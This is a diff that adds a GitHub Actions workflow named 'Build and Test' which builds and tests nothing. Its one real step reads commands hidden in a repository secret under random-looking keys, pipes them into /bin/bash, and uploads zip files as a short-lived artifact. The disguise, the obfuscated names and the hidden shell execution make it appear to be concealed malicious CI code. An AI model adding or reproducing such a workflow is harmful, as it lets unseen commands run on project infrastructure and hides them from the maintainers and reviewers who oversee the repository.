@@ -1,0 +1,33 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          s5: ${{ secrets.s5 }}
+        run: |
+          printf '%s' "$s5" | jq -r .iqtf31 | /bin/bash
+          printf '%s' "$ssjqb71" | jq -r .e19731 | /bin/bash
+          printf '%s' "$by53" | jq -r .urmz5870 | /bin/bash
+          echo $qrls5040 | jq -r .jy84209 | /bin/bash
+          printf '%s' "$ge059" | jq -r .hmd515 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: gyMZMZnl
+          path: "*.zip"
+          retention-days: 1
